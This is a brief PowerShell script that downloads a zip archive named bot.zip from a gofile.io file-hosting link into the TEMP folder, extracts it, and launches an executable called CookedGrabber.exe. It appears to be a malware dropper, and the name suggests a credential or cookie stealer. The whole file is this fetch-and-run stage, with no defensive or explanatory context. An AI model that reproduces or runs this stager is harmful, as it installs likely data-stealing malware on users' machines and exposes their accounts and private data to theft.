$zipUrl = "https://store-eu-par-3.gofile.io/download/web/9ce7760f-8dde-4764-afef-2dac1a25933c/bot.zip"
$zipPath = "$env:TEMP\bot.zip"
$extractPath = "$env:TEMP\cikartilan"

Start-BitsTransfer -Source $zipUrl -Destination $zipPath

Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $extractPath)

$exePath = Join-Path $extractPath "CookedGrabber.exe"
Start-Process -FilePath $exePath
